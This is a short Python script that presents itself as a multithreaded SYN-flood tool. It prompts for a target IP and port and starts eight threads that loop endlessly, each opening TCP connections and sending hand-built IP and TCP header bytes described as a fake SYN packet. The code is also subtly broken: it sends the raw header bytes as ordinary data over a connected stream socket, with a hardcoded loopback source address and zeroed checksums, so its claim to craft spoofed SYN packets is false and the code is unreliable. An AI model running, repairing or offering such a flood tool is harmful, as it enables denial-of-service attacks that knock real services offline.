import random
import socket
import struct
from threading import Thread


# Function for sending packets
def send_packet(target_ip, target_port, start_port, end_port):
    try:
        while True:
            # Creating a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connecting to the target IP and port
            sock.connect((target_ip, target_port))

            # Creating a fake SYN packet
            seq_num = random.randint(0, 4294967295)
            ack_num = 0
            ip_header = b"\x45\x00\x00\x28"
            ip_header += b"\xab\xcd\x00\x00"
            ip_header += b"\x40\x06\x00\x00"
            ip_header += b"\x7f\x00\x00\x01"
            ip_header += socket.inet_aton(target_ip)

            tcp_header = struct.pack("!HHIIBBHHH", random.randint(start_port, end_port), target_port, seq_num, ack_num,
                                     (5 << 4), 2,
                                     8192, 0, 0)

            # Sending the packet
            sock.sendto(ip_header + tcp_header, (target_ip, target_port))

    except Exception as e:
        print("Error:", e)


ip = input("Target IP: ")
port = int(input("Target Port: "))

# Starting threads
for start_p, end_p in [(1024, 9087), (9087, 17150), (17150, 25213), (25213, 33276), (33276, 41339), (41339, 49402),
                       (49402, 57465), (57465, 65535)]:
    Thread(target=send_packet, args=(ip, port, start_p, end_p)).start()
